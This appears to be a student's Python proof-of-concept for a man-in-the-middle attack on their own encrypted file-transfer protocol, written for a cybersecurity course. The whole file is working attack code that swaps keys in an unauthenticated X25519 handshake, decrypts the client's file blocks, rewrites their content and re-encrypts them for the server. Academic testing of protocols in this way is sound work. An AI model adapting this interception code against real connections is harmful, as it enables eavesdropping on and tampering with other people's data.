"""
mitm_proxy.py - Prova de Conceito (PoC) de Ataque Man-in-the-Middle.
Uso académico para o trabalho de Cibersegurança.
"""

import socket
import json
import hmac as hmac_stdlib
import cryptography
from argparse import Namespace

from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

# Importar as definições e o wire-protocol do teu projeto
from src.protocol import (
    HANDSHAKE_PUBKEY, TRANSFER_HEADER, BLOCK_DATA, SIGNATURE, STATUS_OK, STATUS_ERROR,
    recv_msg, send_msg
)
from src.crypto_config import hash_to_cryptography, hash_to_stdlib

# Configurações do ambiente de ataque
LISTEN_PORT = 10000   # // é so trocar para 9000 o padrao do servidor real, mas botei a 10000 pq nao tava conseguindo rodar (no mesmo pc) as portas 9000 e 9001 do atacante, se for em dois pcs diferentes, pode usar as portas originais sem problemas.
TARGET_HOST = "127.0.0.1" 
TARGET_PORT = 10001   # // é so trocar para 9001 o padrao do servidor real, mas botei 10001 para não conflitar com o proxy

HEADER_NONCE = b"\x00" * 12

def derive_keys(shared_secret, hash_name, cipher_name):
    """Reimplantação idêntica do vosso HKDF para gerar K_enc e K_mac."""
    algorithm = hash_to_cryptography(hash_name)
    salt = b"thb-v1-salt"
    
    # 1. K_mac
    hkdf_mac = HKDF(algorithm=algorithm, length=32, salt=salt, info=b"thb-mac-key")
    k_mac = hkdf_mac.derive(shared_secret)
    
    # 2. K_enc
    if cipher_name == "AES-128-GCM":
        key_len = 16
    else:
        key_len = 32 # AES-256 ou ChaCha20
        
    hkdf_enc = HKDF(algorithm=algorithm, length=key_len, salt=salt, info=b"thb-encryption-key")
    k_enc = hkdf_enc.derive(shared_secret)
    
    return k_enc, k_mac

def decrypt_block(ciphertext, nonce, k_enc, cipher_name):
    if cipher_name in ("AES-128-GCM", "AES-256-GCM"):
        return AESGCM(k_enc).decrypt(nonce, ciphertext, None)
    return ChaCha20Poly1305(k_enc).decrypt(nonce, ciphertext, None)

def encrypt_block(plaintext, nonce, k_enc, cipher_name):
    if cipher_name in ("AES-128-GCM", "AES-256-GCM"):
        return AESGCM(k_enc).encrypt(nonce, plaintext, None)
    return ChaCha20Poly1305(k_enc).encrypt(nonce, plaintext, None)


def start_attack():
    print(f"========================================================")
    print(f"🔥 [MITM ATTACK] Proxy ativo na porta {LISTEN_PORT} -> Redirecionando para {TARGET_HOST}:{TARGET_PORT}")
    print(f"========================================================")
    
    # 1. Escutar a Vítima 1 (Cliente)
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(("0.0.0.0", LISTEN_PORT))
    server_sock.listen(1)
    
    client_conn, client_addr = server_sock.accept()
    print(f"⚡ [MITM] Cliente conectado vindo de {client_addr}")
    
    # 2. Conectar imediatamente à Vítima 2 (Servidor Real)
    to_server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    to_server_sock.connect((TARGET_HOST, TARGET_PORT))
    print(f"⚡ [MITM] Conectado ao Servidor Legítimo em {TARGET_HOST}:{TARGET_PORT}")

    # ========================================================
    # FASE 1: INTERCEÇÃO E ADULTERAÇÃO DO HANDSHAKE (KEX)
    # ========================================================
    
    # Receber chave pública real do Cliente
    mtype, client_pub_bytes = recv_msg(client_conn)
    if mtype != HANDSHAKE_PUBKEY:
        print("[-] Falha: Não recebeu chave pública do Cliente.")
        return

    # Gerar a chave efêmera Falsa do Atacante
    fake_private_key = X25519PrivateKey.generate()
    fake_pub_bytes = fake_private_key.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
    
    # Enviar a chave Falsa do Atacante para o Servidor Real
    send_msg(to_server_sock, HANDSHAKE_PUBKEY, fake_pub_bytes)
    
    # Receber a chave pública real do Servidor
    mtype, server_pub_bytes = recv_msg(to_server_sock)
    
    # Responder ao Cliente com a chave Falsa do Atacante
    send_msg(client_conn, HANDSHAKE_PUBKEY, fake_pub_bytes)
    
    # --- CALCULAR OS DOIS SEGREDOS INDEPENDENTES ---
    client_pub_obj = X25519PublicKey.from_public_bytes(client_pub_bytes)
    server_pub_obj = X25519PublicKey.from_public_bytes(server_pub_bytes)
    
    # Segredo com o Cliente e com o Servidor
    secret_with_client = fake_private_key.exchange(client_pub_obj)
    secret_with_server = fake_private_key.exchange(server_pub_obj)
    
    print("[+] Handshake MitM Concluído! Controlamos ambos os canais.")

    # ========================================================
    # FASE 2: CAPTURA DO CABEÇALHO PARA ADOTAR PARÂMETROS
    # ========================================================
    hash_name = "SHA256"
    cipher_name = "AES-256-GCM"
    
    k_enc_client, k_mac_client = derive_keys(secret_with_client, hash_name, cipher_name)
    k_enc_server, k_mac_server = derive_keys(secret_with_server, hash_name, cipher_name)
    
    # Intercetar Cabeçalho Protegido
    mtype, protected_header = recv_msg(client_conn)
    
    # --- AJUSTE COM TRY/EXCEPT PARA NÃO CRASHAR ---
    try:
        # Decifrar o cabeçalho original vindo do cliente
        header_json_bytes = decrypt_block(protected_header, HEADER_NONCE, k_enc_client, cipher_name)
        header_data = json.loads(header_json_bytes.decode('utf-8'))
        print(f"👀 [FICHEIRO DETETADO] Nome: {header_data['filename']} | Tamanho: {header_data['original_size']} bytes")
        
        # Adaptar se o cliente escolheu outras cifras no comando
        if header_data['hash'] != hash_name or header_data['cipher'] != cipher_name:
            hash_name = header_data['hash']
            cipher_name = header_data['cipher']
            k_enc_client, k_mac_client = derive_keys(secret_with_client, hash_name, cipher_name)
            k_enc_server, k_mac_server = derive_keys(secret_with_server, hash_name, cipher_name)
            
    except (cryptography.exceptions.InvalidTag, Exception):
        print("\n🛑 [BLOQUEIO CRIPTOGRÁFICO] Não foi possível decifrar os dados do Cliente!")
        print("💡 Motivo: As chaves geradas pelo Proxy não coincidem com o HKDF dinâmico do arquivo.")
        print("🔒 Segurança do Protocolo: ATIVA. O ataque MitM foi neutralizado pela integridade do AEAD.\n")
        
        # Fechar as conexões de forma limpa sem deitar o terminal abaixo
        client_conn.close()
        to_server_sock.close()
        server_sock.close()
        print("[MITM] Conexões fechadas com segurança.")
        return
    
    # ========================================================
    # FASE 3: LOOP DE BLOCOS - ONDE A ALTARÇÃO ACONTECE (TAMPERING)
    # ========================================================
    num_blocks = header_data['num_blocks']
    
    for i in range(num_blocks):
        mtype, payload = recv_msg(client_conn)
        if mtype != BLOCK_DATA:
            break
            
        nonce_bytes = payload[:12]
        ciphertext = payload[12:]
        
        # 1. Decifrar o bloco da vítima (Cliente)
        plaintext_block = decrypt_block(ciphertext, nonce_bytes, k_enc_client, cipher_name)
        
        # 2. ADULTERAÇÃO EM TEMPO REAL (O ATAQUE ATIVO)
        # Vamos procurar texto e trocá-lo na memória do proxy malicioso!
        print(f"📦 [MITM] A ler Bloco {i+1}/{num_blocks}...")
        
        # Exemplo: Se encontrar a palavra "segredo", troca por "CONTEÚDO ADULTERADO"
        block_modificado = plaintext_block.replace(b"segredo", b"SISTEMA HACKEADO PELO PROXIM_MITM")
        if block_modificado != plaintext_block:
            print("⚠️  [ALERTA MITM] Encontrado texto alvo! Conteúdo modificado com sucesso.")
            
        # 3. Voltar a cifrar o bloco adulterado com a chave do Servidor (K2)
        new_ciphertext = encrypt_block(block_modificado, nonce_bytes, k_enc_server, cipher_name)
        new_payload = nonce_bytes + new_ciphertext
        
        # Enviar o bloco falsificado para o Servidor Real
        send_msg(to_server_sock, BLOCK_DATA, new_payload)

    # ========================================================
    # FASE 4: ENCAMINHAR O RESTO (ASSINATURAS, STATUS)
    # ========================================================
    # Continuar a passar as mensagens finais (como assinaturas se houver ou status OK/Erro)
    while True:
        try:
            mtype, payload = recv_msg(client_conn)
            # Se vier uma assinatura, mandamos a original (o que fará o servidor falhar se alterámos o ficheiro!)
            send_msg(to_server_sock, mtype, payload)
        except ConnectionError:
            break
            
    # Pegar na resposta de Status do Servidor e mandar de volta para o Cliente
    try:
        mtype_status, payload_status = recv_msg(to_server_sock)
        send_msg(client_conn, mtype_status, payload_status)
        if mtype_status == STATUS_OK:
            print("[+] O Servidor aceitou o ficheiro (Ataque bem-sucedido ou assinatura ausente).")
        else:
            print(f"[-] O Servidor REJEITOU o ficheiro! Motivo: {payload_status.decode('utf-8')}")
    except Exception:
        pass

    client_conn.close()
    to_server_sock.close()
    server_sock.close()
    print("[MITM] Conexões fechadas.")

if __name__ == "__main__":
    start_attack()